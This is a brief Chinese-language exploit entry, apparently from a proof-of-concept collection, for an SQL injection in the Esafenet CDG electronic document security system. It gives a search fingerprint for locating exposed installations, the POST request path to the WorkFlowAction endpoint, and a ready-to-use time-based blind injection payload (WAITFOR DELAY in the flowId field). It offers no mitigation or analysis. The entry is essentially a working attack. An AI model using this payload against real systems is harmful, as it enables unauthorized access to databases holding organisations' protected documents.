# 亿赛通CDGWorkFlowAction存在SQL注入漏洞

亿赛通 ｜ SQL注入 ｜ —
- **指纹**：`app="亿赛通-电子文档安全管理系统"`
- **请求**：`POST /CDGServer3/3g/WorkFlowAction;Servicelogin HTTP/1.1`

**Payload**
```
command=Approval&userId=1&fromurl=getTodoList.jsp?curpage=111&flowId=1'%3bWAITFOR+DELAY+'0%3a0%3a5'--
```
- **响应特征**：200